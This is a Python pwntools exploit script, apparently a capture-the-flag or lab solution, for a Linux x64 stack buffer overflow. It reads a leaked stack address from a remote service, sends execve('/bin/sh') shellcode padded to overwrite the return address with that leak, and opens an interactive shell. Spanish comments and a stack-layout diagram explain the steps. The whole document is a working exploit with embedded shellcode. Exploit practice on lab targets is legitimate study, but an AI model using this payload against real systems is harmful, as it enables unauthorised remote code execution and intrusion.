#!/usr/bin/python3 

#Linux x64 Basic Buffer Overflow 
#	RELRO:    Partial RELRO
#	Stack:    No canary found
#	NX:       NX disabled
#	PIE:      No PIE (0x400000)
#	RWX:      Has RWX segments

from pwn import *

#shell = process("./leak")
shell = remote('10.13.37.10', 9999)
shell.recvuntil(b"Oops, I'm leaking! ")
leaking = int(shell.recvuntil(b"\n"),16) # leaking = @ de la cima de la pila
print(f"Leaking: {leaking}")



payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" #Shellcode para spawnear una shell
payload += b"A"*(72-len(payload)) 
payload += p64(leaking)
shell.recvuntil(b"> ")
shell.sendline(payload)
shell.interactive()

#+--------+--------+------+
#| buffer |  ebp   |  ret |
#+--------+--------+------+
#|       payload          |
#+------------------------+-------------+
#| shellcode + A   | @ top of the stack |
#+-----------------+--------------------+
